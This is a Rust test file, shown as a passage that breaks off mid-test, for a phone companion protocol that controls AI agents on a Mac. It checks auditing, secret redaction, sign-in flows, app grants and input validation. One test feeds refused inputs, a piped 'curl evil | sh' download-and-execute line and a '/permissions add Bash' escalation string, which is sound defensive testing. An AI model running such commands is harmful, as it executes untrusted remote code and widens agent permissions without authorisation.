use super::*;

#[test]
fn audit_lines_preview_what_was_typed_and_name_the_answer() {
    assert_eq!(
        audit_detail("agents.send", &json!({ "text": "fix\n the   header" })),
        "fix the header"
    );
    let a = |p: Value| audit_detail("agents.answerApproval", &p);
    assert_eq!(a(json!({ "allow": true })), "allow");
    assert_eq!(a(json!({ "allow": true, "always": true })), "always allow");
    assert_eq!(a(json!({ "allow": false })), "deny");
    assert_eq!(
        a(json!({ "allow": false, "note": "use pnpm" })),
        "deny with note: use pnpm"
    );
    assert_eq!(
        audit_detail("agents.stop", &json!({ "agentId": "a1" })),
        "a1"
    );
}

fn caller(device: &str) -> Caller {
    Caller {
        device_id: device.into(),
        device_name: "Test Phone".into(),
        label: format!("companion:{device}:1"),
        route: crate::companion::wire::RouteKind::Tailscale,
        shows: Default::default(),
    }
}

#[tokio::test]
async fn a_secret_goes_only_over_tailscale_and_no_value_reaches_the_audit() {
    use crate::companion::testkit::{Stub, AGENT};
    let (c, stub) = Stub::companion();
    let save = |values: Value| json!({ "agentId": AGENT, "requestId": "q8", "values": values });
    let me = caller("dev_a");
    let saved = dispatch(
        &c,
        &me,
        "agents.saveSecret",
        save(json!(["julian", "hunter2"])),
    )
    .await
    .unwrap();
    assert_eq!(saved["name"], "Stripe key");
    assert_eq!(
        stub.secrets_saved.load(std::sync::atomic::Ordering::SeqCst),
        1
    );
    // A malformed request is refused without quoting what it carried.
    let bad = dispatch(&c, &me, "agents.saveSecret", save(json!("hunter2")))
        .await
        .unwrap_err();
    assert!(!bad.summary().contains("hunter2"));
    let extra = json!({ "agentId": AGENT, "requestId": "q8", "values": ["a"], "v": "hunter2" });
    assert!(!dispatch(&c, &me, "agents.saveSecret", extra)
        .await
        .unwrap_err()
        .summary()
        .contains("hunter2"));
    for (_, method, detail, _) in stub.audited() {
        assert_eq!(method, "agents.saveSecret");
        assert!(
            !detail.contains("hunter2") && !detail.contains("julian"),
            "{detail}"
        );
    }
    assert_eq!(stub.audited().len(), 3);
}

/// A phone that asks for timelines' folded lines gets no steps in the
/// page, and reads them one turn at a time; one that doesn't ask (an
/// older phone) still gets them inline.
#[tokio::test]
async fn timelines_come_without_steps_only_when_asked_and_open_on_their_own() {
    use crate::companion::testkit::{Stub, AGENT};
    let (c, _stub) = Stub::companion();
    let me = caller("dev_a");
    let page = |extra: Value| {
        let mut p = json!({ "agentId": AGENT, "limit": 100 });
        if let (Some(o), Some(e)) = (p.as_object_mut(), extra.as_object()) {
            o.extend(e.clone());
        }
        p
    };
    let work_of = |page: &Value| {
        page["messages"]
            .as_array()
            .unwrap()
            .iter()
            .find(|m| m["id"] == "m25")
            .unwrap()["work"]
            .clone()
    };
    let inline = dispatch(&c, &me, "agents.messages", page(json!({})))
        .await
        .unwrap();
    let full = work_of(&inline);
    assert!(!full["steps"].as_array().unwrap().is_empty());
    assert!(full.get("stepsOmitted").is_none());

    let lazy = dispatch(
        &c,
        &me,
        "agents.messages",
        page(json!({ "work": "summary" })),
    )
    .await
    .unwrap();
    let folded = work_of(&lazy);
    assert_eq!(folded["steps"], json!([]));
    assert_eq!(folded["stepsOmitted"], json!(true));
    assert_eq!(folded["stepCount"], full["stepCount"]);
    assert_eq!(folded["fileCount"], full["fileCount"]);
    assert!(lazy.to_string().len() < inline.to_string().len());

    let opened = dispatch(
        &c,
        &me,
        "agents.workSteps",
        json!({ "agentId": AGENT, "messageId": "m25" }),
    )
    .await
    .unwrap();
    assert_eq!(opened["work"], full);
    // A line with no timeline: null, not an error.
    let none = dispatch(
        &c,
        &me,
        "agents.workSteps",
        json!({ "agentId": AGENT, "messageId": "m01" }),
    )
    .await
    .unwrap();
    assert_eq!(none["work"], Value::Null);
    assert!(READ_ONLY_METHODS.contains(&"agents.workSteps"));
}

/// The phone answers a login card: Connect starts it on the Mac, the
/// team list connects a row, "Not needed" puts one away, a key never
/// reaches the audit, and "What it can reach" is read-only.
#[tokio::test]
async fn a_login_card_is_answered_from_the_phone_and_runs_on_the_mac() {
    use crate::companion::testkit::{Stub, AGENT};
    let (c, stub) = Stub::companion();
    let me = caller("dev_a");
    let card = json!({ "agentId": AGENT, "requestId": "q12", "optionId": "claude_ai" });
    assert_eq!(
        dispatch(&c, &me, "agents.loginStart", card).await.unwrap(),
        Value::Null
    );
    // A way in must be named.
    assert!(dispatch(
        &c,
        &me,
        "agents.loginStart",
        json!({ "agentId": AGENT, "requestId": "q12" })
    )
    .await
    .is_err());
    dispatch(
        &c,
        &me,
        "agents.loginCancel",
        json!({ "agentId": AGENT, "requestId": "q12" }),
    )
    .await
    .unwrap();
    dispatch(
        &c,
        &me,
        "agents.loginsConnect",
        json!({ "key": "google", "optionId": "claude_ai", "skip": ["agent_c"] }),
    )
    .await
    .unwrap();
    dispatch(
        &c,
        &me,
        "agents.loginDismiss",
        json!({ "agentId": AGENT, "requestId": "q20" }),
    )
    .await
    .unwrap();
    dispatch(
        &c,
        &me,
        "agents.loginSaveKey",
        json!({ "agentId": AGENT, "requestId": "q12", "value": "xai-secret-value-123" }),
    )
    .await
    .unwrap();
    assert_eq!(
        stub.logins.lock().unwrap().as_slice(),
        [
            "start q12 claude_ai",
            "cancel q12",
            "team google claude_ai",
            "dismiss q20",
            "key q12"
        ]
    );
    let team = dispatch(&c, &me, "agents.loginsTeam", json!({}))
        .await
        .unwrap();
    assert_eq!(team["needs"][0]["title"], "Google · Gmail + Calendar");
    let reach = dispatch(&c, &me, "agents.reach", json!({ "agentId": AGENT }))
        .await
        .unwrap();
    assert_eq!(reach["connections"][0]["account"], "work@acme.com");
    // Not needed: a card's service, a row, the rest; then Undo.
    let receipt = dispatch(
        &c,
        &me,
        "agents.loginNotNeeded",
        json!({ "agentId": AGENT, "requestId": "q21" }),
    )
    .await
    .unwrap();
    assert_eq!(receipt["keys"][0], "other:acme bank");
    dispatch(
        &c,
        &me,
        "agents.loginsNotNeeded",
        json!({ "keys": ["slack"] }),
    )
    .await
    .unwrap();
    dispatch(&c, &me, "agents.loginsNotNeeded", json!({}))
        .await
        .unwrap();
    assert!(
        dispatch(&c, &me, "agents.loginsUndecline", json!({ "keys": [] }))
            .await
            .is_err(),
        "an Undo names what it turns back on"
    );
    let back = dispatch(
        &c,
        &me,
        "agents.loginsUndecline",
        json!({ "keys": ["slack"] }),
    )
    .await
    .unwrap();
    assert_eq!(back, json!(1));
    assert_eq!(
        stub.logins.lock().unwrap()[5..],
        [
            "not needed q21",
            "not needed rows slack",
            "not needed rows linkedin",
            "undecline slack"
        ]
    );
    let audited = stub.audited();
    assert!(audited
        .iter()
        .all(|(_, _, detail, _)| !detail.contains("xai-secret-value")));
    // Reads aren't audited; every change is.
    assert!(!audited
        .iter()
        .any(|(_, m, _, _)| m == "agents.reach" || m == "agents.loginsTeam"));
    assert!(audited.iter().any(|(_, m, _, _)| m == "agents.loginStart"));
    assert!(!serde_json::to_string(&reach)
        .unwrap()
        .to_lowercase()
        .contains("token\""));
}

/// Signing in on the Mac's Chrome from the phone: every call carries the
/// caller's own device id, what's typed never reaches the audit or the
/// backend's record, and nothing past the parse is echoed back.
#[tokio::test]
async fn a_phone_sign_in_in_the_macs_chrome_never_audits_or_echoes_what_is_typed() {
    use crate::companion::testkit::{Stub, AGENT};
    let (c, stub) = Stub::companion();
    let me = caller("dev_a");
    let secret = "correct-horse-battery-staple";
    let begun = dispatch(
        &c,
        &me,
        "agents.signinBegin",
        json!({ "agentId": AGENT, "requestId": "q12" }),
    )
    .await
    .unwrap();
    let id = begun["sessionId"].as_str().unwrap().to_string();
    dispatch(&c, &me, "agents.signinFrame", json!({ "sessionId": id }))
        .await
        .unwrap();
    for input in [
        json!({ "kind": "tap", "x": 10, "y": 20 }),
        json!({ "kind": "type", "text": secret, "secure": true }),
        json!({ "kind": "key", "key": "enter" }),
        json!({ "kind": "back" }),
    ] {
        dispatch(
            &c,
            &me,
            "agents.signinInput",
            json!({ "sessionId": id, "input": input }),
        )
        .await
        .unwrap();
    }
    // Refused at the parse, without saying what it was.
    for bad in [
        json!({ "sessionId": id, "input": { "kind": "key", "key": "cmd+l", "text": secret } }),
        json!({ "sessionId": id, "input": { "kind": "navigate", "url": secret } }),
        json!({ "sessionId": "", "input": { "kind": "type", "text": secret } }),
    ] {
        let e = dispatch(&c, &me, "agents.signinInput", bad)
            .await
            .unwrap_err();
        assert!(!format!("{e:?}").contains(secret));
    }
    dispatch(&c, &me, "agents.signinDone", json!({ "sessionId": id }))
        .await
        .unwrap();
    dispatch(&c, &me, "agents.signinStop", json!({ "sessionId": id }))
        .await
        .unwrap();
    let record = stub.logins.lock().unwrap().join("\n");
    assert!(!record.contains(secret), "{record}");
    assert!(record.lines().all(|l| l.ends_with("by dev_a")), "{record}");
    assert!(
        record.contains("Type { chars: 28, secure: true }"),
        "{record}"
    );
    // The router writes no line for any of it: the session writes its own.
    let audited = stub.audited();
    assert!(
        audited
            .iter()
            .all(|(_, m, d, _)| !m.starts_with("agents.signin") && !d.contains(secret)),
        "{audited:?}"
    );
    assert_eq!(
        audit_detail("agents.signinInput", &json!({ "text": secret })),
        "phone sign-in"
    );
    for m in SELF_AUDITED_METHODS {
        assert!(METHODS.contains(m));
        assert!(!READ_ONLY_METHODS.contains(m));
    }
}

/// "Try the agents' browser": the phone names the way; none, the Mac picks.
#[tokio::test]
async fn a_phone_sign_in_may_ask_for_the_agents_browser() {
    use crate::companion::testkit::{Stub, AGENT};
    let (c, stub) = Stub::companion();
    let me = caller("dev_a");
    for params in [
        json!({ "agentId": AGENT, "requestId": "q12", "way": "agents_browser" }),
        json!({ "agentId": AGENT, "requestId": "q12" }),
    ] {
        dispatch(&c, &me, "agents.signinBegin", params)
            .await
            .unwrap();
    }
    let e = dispatch(
        &c,
        &me,
        "agents.signinBegin",
        json!({ "agentId": AGENT, "requestId": "q12", "way": "somewhere" }),
    )
    .await;
    assert!(e.is_err());
    let record = stub.logins.lock().unwrap().join("\n");
    assert!(record.contains("way: Some(AgentsBrowser)"), "{record}");
    assert!(record.contains("way: None"), "{record}");
}

/// Step in from the phone: the caller's own device begins it, the same
/// frames and input drive it, Done is Hand back, and the router audits
/// none of it (the session writes its own line).
#[tokio::test]
async fn a_phone_step_in_begins_for_the_caller_and_hands_back() {
    use crate::companion::testkit::{Stub, AGENT};
    let (c, stub) = Stub::companion();
    let me = caller("dev_a");
    let begun = dispatch(
        &c,
        &me,
        "agents.stepInBegin",
        json!({ "agentId": AGENT, "requestId": "q_step" }),
    )
    .await
    .unwrap();
    assert_eq!(begun["stepIn"], true);
    let id = begun["sessionId"].as_str().unwrap().to_string();
    dispatch(&c, &me, "agents.signinFrame", json!({ "sessionId": id }))
        .await
        .unwrap();
    let done = dispatch(&c, &me, "agents.signinDone", json!({ "sessionId": id }))
        .await
        .unwrap();
    assert_eq!(done["outcome"], "handed_back");
    // Malformed: refused at the parse.
    for bad in [
        json!({ "agentId": "", "requestId": "q_step" }),
        json!({ "agentId": AGENT }),
    ] {
        assert!(dispatch(&c, &me, "agents.stepInBegin", bad).await.is_err());
    }
    let record = stub.logins.lock().unwrap().join("\n");
    assert!(
        record.contains("StepIn { agent_id: \"") && record.contains("q_step"),
        "{record}"
    );
    assert!(record.lines().all(|l| l.ends_with("by dev_a")), "{record}");
    assert!(stub
        .audited()
        .iter()
        .all(|(_, m, _, _)| m != "agents.stepInBegin"));
    assert!(super::super::wire::MAC_FEATURES.contains(&"stepIn.phone"));
}

/// Signing in on the phone itself: the sheet is begun for the caller's
/// own device, its answer is relayed with the caller's device id, and
/// neither the URL nor the code ever reaches the audit.
#[tokio::test]
async fn a_phone_sign_in_is_bound_to_its_device_and_never_audited_with_its_code() {
    use crate::companion::testkit::{Stub, AGENT};
    let (c, stub) = Stub::companion();
    let me = caller("dev_a");
    let begun = dispatch(
        &c,
        &me,
        "agents.loginPhoneBegin",
        json!({ "agentId": AGENT, "requestId": "q12", "optionId": "oauth" }),
    )
    .await
    .unwrap();
    assert_eq!(begun["redirectUri"], "mogbot-companion://oauth");
    dispatch(
        &c,
        &me,
        "agents.loginPhoneBegin",
        json!({ "key": "linear", "optionId": "oauth", "skip": ["agent_c"] }),
    )
    .await
    .unwrap();
    // One card or one row, never both or neither.
    for bad in [
        json!({ "optionId": "oauth" }),
        json!({ "agentId": AGENT, "requestId": "q12", "key": "linear", "optionId": "oauth" }),
        json!({ "agentId": AGENT, "requestId": "q12" }),
    ] {
        assert!(dispatch(&c, &me, "agents.loginPhoneBegin", bad)
            .await
            .is_err());
    }
    let code = "SplxlOBeZQQYbYS6WxSbIA";
    dispatch(
        &c,
        &me,
        "agents.loginPhoneFinish",
        json!({ "flowId": "flow1",
                    "callbackUrl": format!("mogbot-companion://oauth?code={code}&state=s") }),
    )
    .await
    .unwrap();
    // claude.ai or GitHub's device code on the phone: the Mac's browser stays shut.
    dispatch(
        &c,
        &me,
        "agents.loginStart",
        json!({ "agentId": AGENT, "requestId": "q12", "optionId": "gh", "onPhone": true }),
    )
    .await
    .unwrap();
    assert_eq!(
        stub.logins.lock().unwrap().as_slice(),
        [
            "sheet q12 oauth by dev_a",
            "sheet linear oauth by dev_a",
            "finish flow1 by dev_a",
            "start q12 gh on phone",
        ]
    );
    for (_, _, detail, _) in stub.audited() {
        assert!(
            !detail.contains(code) && !detail.contains("state=") && !detail.contains("://"),
            "{detail}"
        );
    }
}

/// "Apps your agents can use" from the phone: the list is a read (never
/// audited) with no token or Mac-only page in it; connecting, who can use
/// it and Remove reach the desk's own commands, are audited without the
/// sign-in's URL or code, and a sheet is begun for the caller's device.
#[tokio::test]
async fn the_phone_apps_screen_reaches_the_desks_commands_and_no_token() {
    use crate::companion::testkit::{Stub, AGENT};
    let (c, stub) = Stub::companion();
    let me = caller("dev_a");
    let list = dispatch(&c, &me, "agents.apps", json!({})).await.unwrap();
    let text = list.to_string();
    assert!(list["apps"].as_array().is_some_and(|a| !a.is_empty()));
    assert_eq!(list["connections"][1]["kind"], "oauth");
    assert_eq!(list["connections"][1]["grants"][0]["access"], "full");
    for never in [
        "accessToken",
        "refreshToken",
        "serverUrl",
        "serverKey",
        "serverName",
        "notion.com/authorize",
    ] {
        assert!(!text.contains(never), "{never} in {text}");
    }
    // The phone's own sheet keeps its URL: that's what it opens.
    assert!(list["flows"][1]["flow"]["url"].is_string());

    let grants =
        json!([{ "agentId": AGENT, "access": "full" }, { "agentId": "chief", "access": "read" }]);
    dispatch(
        &c,
        &me,
        "agents.appsConnect",
        json!({ "service": "linear", "grants": grants }),
    )
    .await
    .unwrap();
    let begun = dispatch(
        &c,
        &me,
        "agents.appsPhoneBegin",
        json!({ "service": "notion", "grants": [], "again": "c9" }),
    )
    .await
    .unwrap();
    assert_eq!(begun["redirectUri"], "mogbot-companion://oauth");
    let code = "SplxlOBeZQQYbYS6WxSbIA";
    dispatch(
        &c,
        &me,
        "agents.loginPhoneFinish",
        json!({ "flowId": begun["flowId"],
                    "callbackUrl": format!("mogbot-companion://oauth?code={code}&state=s") }),
    )
    .await
    .unwrap();
    dispatch(&c, &me, "agents.appsCancel", json!({ "service": "notion" }))
        .await
        .unwrap();
    // Narrowing to nobody is the user's answer too.
    let changed = dispatch(
        &c,
        &me,
        "agents.appsSetGrants",
        json!({ "connectionId": "c2", "grants": [] }),
    )
    .await
    .unwrap();
    assert_eq!(changed["grants"], json!([]));
    dispatch(
        &c,
        &me,
        "agents.appsRemove",
        json!({ "connectionId": "c2" }),
    )
    .await
    .unwrap();
    let gone = dispatch(
        &c,
        &me,
        "agents.appsRemove",
        json!({ "connectionId": "gone" }),
    )
    .await;
    assert!(gone.is_err());
    assert_eq!(
        stub.logins.lock().unwrap().as_slice(),
        [
            "apps connect linear for a1:full,chief:read",
            "apps sheet notion for nobody by dev_a",
            "finish flow2 by dev_a",
            "apps cancel notion",
            "apps grants c2 nobody",
            "apps remove c2",
        ]
    );
    let audited = stub.audited();
    let methods: Vec<&str> = audited.iter().map(|(_, m, _, _)| m.as_str()).collect();
    assert!(!methods.contains(&"agents.apps"), "{methods:?}");
    for m in [
        "agents.appsConnect",
        "agents.appsPhoneBegin",
        "agents.appsSetGrants",
        "agents.appsRemove",
    ] {
        assert!(methods.contains(&m), "{m} not audited: {methods:?}");
    }
    let connect = audited
        .iter()
        .find(|(_, m, _, _)| m == "agents.appsConnect")
        .unwrap();
    assert!(
        connect.2.contains("linear") && connect.2.contains("a1 (full)"),
        "{}",
        connect.2
    );
    let refused = audited
        .iter()
        .find(|(_, m, _, ok)| m == "agents.appsRemove" && !ok);
    assert!(refused.is_some());
    for (_, _, detail, _) in audited {
        assert!(
            !detail.contains(code) && !detail.contains("state=") && !detail.contains("://"),
            "{detail}"
        );
    }
}

#[tokio::test]
async fn the_apps_methods_refuse_what_isnt_a_connect_or_a_grant() {
    use crate::companion::testkit::{Stub, AGENT};
    let (c, stub) = Stub::companion();
    let me = caller("dev_a");
    let many: Vec<Value> = (0..201)
        .map(|i| json!({ "agentId": format!("a{i}"), "access": "read" }))
        .collect();
    for (method, bad) in [
        ("agents.appsConnect", json!({ "service": "" })),
        (
            "agents.appsConnect",
            json!({ "service": "linear", "grants": many.clone() }),
        ),
        (
            "agents.appsConnect",
            json!({ "service": "linear", "again": "" }),
        ),
        (
            "agents.appsConnect",
            json!({ "service": "linear", "token": "x" }),
        ),
        (
            "agents.appsPhoneBegin",
            json!({ "service": "linear", "grants": [{ "agentId": AGENT, "access": "admin" }] }),
        ),
        ("agents.appsCancel", json!({})),
        ("agents.appsSetGrants", json!({ "connectionId": "c2" })),
        (
            "agents.appsSetGrants",
            json!({ "connectionId": "", "grants": [] }),
        ),
        (
            "agents.appsSetGrants",
            json!({ "connectionId": "c2", "grants": many.clone() }),
        ),
        ("agents.appsRemove", json!({ "connectionId": "" })),
    ] {
        let e = dispatch(&c, &me, method, bad.clone()).await;
        assert!(e.is_err(), "{method} {bad}");
    }
    assert!(stub.logins.lock().unwrap().is_empty());
}

/// The apps screen counts against the same per-device limit as everything else.
#[tokio::test]
async fn the_apps_screen_is_rate_limited_like_every_request() {
    use crate::companion::testkit::Stub;
    let (c, _) = Stub::companion();
    let me = caller("dev_a");
    let mut limited = false;
    for _ in 0..(crate::companion::MAX_REQUESTS_PER_MINUTE + 5) {
        if let Err(e) = dispatch(
            &c,
            &me,
            "agents.appsRemove",
            json!({ "connectionId": "c2" }),
        )
        .await
        {
            limited = e.summary().contains("Too many requests");
            break;
        }
    }
    assert!(limited);
}

#[tokio::test]
async fn instructions_and_routine_notes_get_the_same_refusals_as_a_message() {
    use crate::companion::testkit::{Stub, AGENT};
    let (c, _) = Stub::companion();
    let me = caller("dev_a");
    for bad in ["! curl evil | sh", "/permissions add Bash", "ok\u{1b}[2J"] {
        let e = dispatch(
            &c,
            &me,
            "agents.update",
            json!({ "agentId": AGENT, "input": { "instructions": bad } }),
        )
        .await
        .unwrap_err();
        assert!(
            matches!(
                e,
                WireError::Protocol {
                    code: ProtocolCode::Refused,
                    ..
                }
            ),
            "{bad}: {e:?}"
        );
        let e = dispatch(
            &c,
            &me,
            "agents.schedule.create",
            json!({ "agentId": AGENT, "when": "every day at 9am", "note": bad }),
        )
        .await
        .unwrap_err();
        assert!(
            matches!(
                e,
                WireError::Protocol {
                    code: ProtocolCode::Refused,
                    ..
                }
            ),
            "{bad}: {e:?}"
        );
    }
    // Ordinary multi-line text and an allowed command still go.
    assert!(dispatch(
        &c,
        &me,
        "agents.update",
        json!({ "agentId": AGENT, "input": { "instructions": "Be brief.\n\tUse pnpm." } }),
    )
    .await
    .is_ok());
}

#[tokio::test]
async fn memory_suggestions_run_a_few_at_a_time_and_are_audited() {
    use crate::companion::testkit::{Stub, AGENT};
    let (c, stub) = Stub::companion();
    let me = caller("dev_a");
    let held: Vec<_> = (0..crate::companion::limits::MAX_SUGGESTS_AT_ONCE)
        .map(|_| c.suggests.try_take("all", usize::MAX).unwrap())
        .collect();
    let busy = dispatch(&c, &me, "agents.memorySuggest", json!({ "text": "x" }))
        .await
        .unwrap_err();
    assert!(matches!(
        busy,
        WireError::Protocol {
            code: ProtocolCode::RateLimited,
            ..
        }
    ));
    drop(held);
    dispatch(
        &c,
        &me,
        "agents.memorySuggest",
        json!({ "text": "Remember pnpm" }),
    )
    .await
    .unwrap();
    let _ = AGENT;
    assert!(stub
        .audited()
        .iter()
        .any(|a| a.1 == "agents.memorySuggest" && a.3));
}

#[tokio::test]
async fn a_phone_creates_an_agent_once_per_client_id_and_it_is_audited() {
    use crate::companion::testkit::Stub;
    let (c, stub) = Stub::companion();
    let me = caller("dev_a");
    let params = json!({
        "input": { "name": "  Inbox ", "role": "Keeps my inbox\n down to what matters", "color": "teal" },
        "clientId": "new-1",
    });
    let made = dispatch(&c, &me, "agents.create", params.clone())
        .await
        .unwrap();
    assert_eq!(made["name"], "Inbox");
    assert_eq!(made["role"], "Keeps my inbox down to what matters");
    assert_eq!(made["color"], "teal");
    assert!(made.get("usage").is_none(), "a StoredAgent has no usage");
    // A retry after a dropped socket is the same agent, not a second.
    let again = dispatch(&c, &me, "agents.create", params).await.unwrap();
    assert_eq!(made, again);
    assert_eq!(stub.created.lock().unwrap().len(), 1);
    let audited = stub.audited();
    assert_eq!(audited[0].1, "agents.create");
    assert_eq!(
        audited[0].2,
        "create Inbox — Keeps my inbox down to what matters"
    );
    assert!(audited[0].3);
    assert!(super::METHODS.contains(&"agents.create"));
    assert!(!super::READ_ONLY_METHODS.contains(&"agents.create"));
}

#[tokio::test]
async fn a_phone_drafts_then_creates_with_what_it_reviewed() {
    use crate::companion::testkit::Stub;
    let (c, stub) = Stub::companion();
    let me = caller("dev_a");
    let draft = dispatch(
        &c,
        &me,
        "agents.draft",
        json!({ "description": "Reads my newsletters and sends me five lines at 8" }),
    )
    .await
    .unwrap();
    assert_eq!(draft["name"], "Morning Brief");
    assert_eq!(draft["routines"][0]["then"][0]["askFirst"], true);
    assert!(super::METHODS.contains(&"agents.draft"));
    assert!(!super::READ_ONLY_METHODS.contains(&"agents.draft"));
    // A control character in what would be sent later, unwatched: refused.
    let bad = dispatch(
        &c,
        &me,
        "agents.create",
        json!({ "input": { "name": "Brief", "routines": [
                { "when": "every weekday at 8:00", "note": "Read\u{1b}[2J", "then": [] }
            ] } }),
    )
    .await;
    assert!(bad.is_err());
    dispatch(
        &c,
        &me,
        "agents.create",
        json!({ "input": {
                "name": "Brief",
                "role": "Five lines every weekday",
                "instructions": "You read the newsletters.",
                "routines": [{ "when": "every weekday at 8:00", "note": "Draft the brief",
                    "then": [{ "text": "Post it to #team", "askFirst": true }] }]
            } }),
    )
    .await
    .unwrap();
    let made = stub.created.lock().unwrap().last().cloned().unwrap();
    assert_eq!(
        made.instructions.as_deref(),
        Some("You read the newsletters.")
    );
    assert_eq!(made.routines.len(), 1);
    assert!(made.routines[0].then[0].ask_first);
    let audited = stub.audited();
    assert!(audited
        .iter()
        .any(|a| a.1 == "agents.draft" && a.2.starts_with("draft: ")));
}

#[tokio::test]
async fn a_phone_made_agent_takes_only_a_name_role_and_colour() {
    use crate::companion::testkit::Stub;
    let (c, stub) = Stub::companion();
    let me = caller("dev_a");
    let create = |input: Value| dispatch(&c, &me, "agents.create", json!({ "input": input }));
    // The engine, model and project stay the desk's.
    for extra in [
        json!({ "name": "Ops", "engine": "codex" }),
        json!({ "name": "Ops", "model": "opus" }),
        json!({ "name": "Ops", "project": "/etc" }),
        json!({ "name": "Ops", "routines": "daily" }),
    ] {
        let refused = create(extra).await.unwrap_err();
        assert!(refused.summary().contains("name, what it should do"));
    }
    assert!(create(json!({ "name": "   " }))
        .await
        .unwrap_err()
        .summary()
        .contains("Give the agent a name"));
    assert!(create(json!({ "name": "x".repeat(41) })).await.is_err());
    assert!(create(json!({ "name": "Ops", "role": "x".repeat(501) }))
        .await
        .is_err());
    assert!(create(json!({ "name": "Ops", "color": "chartreuse" }))
        .await
        .unwrap_err()
        .summary()
        .contains("isn't one of the agent colours"));
    assert!(create(json!({ "name": "Ops\u{1b}[2J" })).await.is_err());
    // The desk's own refusal comes back as it is.
    assert!(create(json!({ "name": "finance" }))
        .await
        .unwrap_err()
        .summary()
        .contains("already an agent called"));
    assert!(stub.created.lock().unwrap().is_empty());
    // No colour picked: the backend chooses, as the desk does.
    let made = create(json!({ "name": "Ops" })).await.unwrap();
    assert_eq!(stub.created.lock().unwrap()[0].color, None);
    assert_eq!(made["role"], "");
    // Refusals are audited too, as failures.
    assert!(stub
        .audited()
        .iter()
        .any(|(_, m, _, ok)| m == "agents.create" && !ok));
}

#[tokio::test]
async fn a_phone_sets_new_agents_defaults_as_the_desk_checks_them() {
    use crate::companion::testkit::Stub;
    let (c, stub) = Stub::companion();
    let me = caller("dev_a");
    let set = |params: Value| dispatch(&c, &me, "agents.setDefaults", params);
    // Read with the overview: what's chosen, and where new agents start.
    let overview = dispatch(&c, &me, "agents.overview", json!({}))
        .await
        .unwrap();
    assert_eq!(overview["defaults"]["engine"], "codex");
    assert_eq!(overview["defaults"]["startsOn"], "claude");
    assert_eq!(overview["defaults"]["model"], "opus");
    // Nothing, or anything else, is refused before the Mac sees it.
    assert!(set(json!({})).await.is_err());
    assert!(set(json!({ "model": "opus" })).await.is_err());
    assert!(set(json!({ "engine": 3 })).await.is_err());
    assert!(stub.defaults.lock().unwrap().is_empty());
    // The Mac's own refusal (a signed-out engine) comes back as it is.
    assert!(set(json!({ "engine": "codex" }))
        .await
        .unwrap_err()
        .summary()
        .contains("isn't signed in"));
    let view = set(json!({ "engine": "claude", "claudeModel": "" }))
        .await
        .unwrap();
    assert_eq!(view["startsOn"], "claude");
    let sent = stub.defaults.lock().unwrap().clone();
    assert_eq!(sent.len(), 1);
    assert_eq!(sent[0].engine.as_deref(), Some("claude"));
    assert_eq!(sent[0].claude_model.as_deref(), Some(""));
    // A settings write: audited, refusals included, in plain words.
    assert!(!READ_ONLY_METHODS.contains(&"agents.setDefaults"));
    let audited = stub.audited();
    assert!(audited
        .iter()
        .any(|(_, m, detail, ok)| m == "agents.setDefaults"
            && *ok
            && detail == "new agents: engine claude, Claude Code model default"));
    assert!(audited
        .iter()
        .any(|(_, m, _, ok)| m == "agents.setDefaults" && !ok));
}

#[tokio::test]
async fn a_phone_reads_and_sets_quiet_hours() {
    use crate::companion::testkit::Stub;
    let (c, stub) = Stub::companion();
    let me = caller("dev_a");
    let read = dispatch(&c, &me, "agents.quietHours", json!({}))
        .await
        .unwrap();
    assert_eq!(read["window"]["start"], 1320);
    assert!(READ_ONLY_METHODS.contains(&"agents.quietHours"));
    let set = |params: Value| dispatch(&c, &me, "agents.setQuietHours", params);
    // The same window twice, or a minute past the day: refused.
    assert!(set(json!({ "window": { "start": 600, "end": 600 } }))
        .await
        .is_err());
    assert!(set(json!({ "window": { "start": 1440, "end": 60 } }))
        .await
        .is_err());
    assert!(set(json!({ "window": "late" })).await.is_err());
    let on = set(json!({ "window": { "start": 1320, "end": 420 } }))
        .await
        .unwrap();
    assert_eq!(on["window"]["end"], 420);
    let off = set(json!({ "window": null })).await.unwrap();
    assert!(off["window"].is_null());
    // Audited in plain words.
    let audited = stub.audited();
    assert!(audited
        .iter()
        .any(|(_, m, detail, ok)| m == "agents.setQuietHours"
            && *ok
            && detail == "quiet hours: 22:00–07:00"));
    assert!(audited
        .iter()
        .any(|(_, m, detail, ok)| m == "agents.setQuietHours"
            && *ok
            && detail == "quiet hours: off"));
}

#[tokio::test]
async fn a_phone_reads_and_sets_the_morning_brief() {
    use crate::companion::testkit::Stub;
    let (c, stub) = Stub::companion();
    let me = caller("dev_a");
    let read = dispatch(&c, &me, "agents.morningBrief", json!({}))
        .await
        .unwrap();
    assert_eq!(read["on"], true);
    assert_eq!(read["at"], 480);
    assert!(READ_ONLY_METHODS.contains(&"agents.morningBrief"));
    let set = |params: Value| dispatch(&c, &me, "agents.setMorningBrief", params);
    assert!(set(json!({ "on": true })).await.is_err());
    assert!(set(json!({ "on": true, "at": 1440 })).await.is_err());
    assert!(set(json!({ "on": "yes", "at": 450 })).await.is_err());
    let on = set(json!({ "on": true, "at": 450 })).await.unwrap();
    assert_eq!(on["at"], 450);
    let off = set(json!({ "on": false, "at": 450 })).await.unwrap();
    assert_eq!(off["on"], false);
    let audited = stub.audited();
    assert!(audited
        .iter()
        .any(|(_, m, detail, ok)| m == "agents.setMorningBrief"
            && *ok
            && detail == "morning brief: 7:30 AM"));
    assert!(audited
        .iter()
        .any(|(_, m, detail, ok)| m == "agents.setMorningBrief"
            && *ok
            && detail == "morning brief: off"));
}

#[tokio::test]
async fn a_phone_reads_and_sets_how_independent_agents_are() {
    use crate::agents::independence::Level;
    use crate::companion::testkit::Stub;
    let (c, stub) = Stub::companion();
    let me = caller("dev_a");
    let overview = dispatch(&c, &me, "agents.overview", json!({}))
        .await
        .unwrap();
    assert_eq!(overview["independence"], "go_hard");
    let set = |params: Value| dispatch(&c, &me, "agents.setIndependence", params);
    assert!(set(json!({})).await.is_err());
    assert!(set(json!({ "level": "yolo" })).await.is_err());
    assert!(set(json!({ "level": 2 })).await.is_err());
    assert!(stub.independence.lock().unwrap().is_empty());
    let answer = set(json!({ "level": "often" })).await.unwrap();
    assert_eq!(answer["level"], "often");
    assert_eq!(*stub.independence.lock().unwrap(), vec![Level::Often]);
    assert!(!READ_ONLY_METHODS.contains(&"agents.setIndependence"));
    assert!(stub
        .audited()
        .iter()
        .any(|(_, m, detail, ok)| m == "agents.setIndependence"
            && *ok
            && detail == "independence: often"));
}

/// Persona review 2026-11-09 (the Maximizer): the phone changes the
/// mode, adds to the list of ideas for leftover usage and starts it, audited.
#[tokio::test]
async fn a_phone_changes_the_usage_mode_and_the_spare_list_audited() {
    use crate::companion::testkit::Stub;
    let (c, stub) = Stub::companion();
    let me = caller("dev_a");
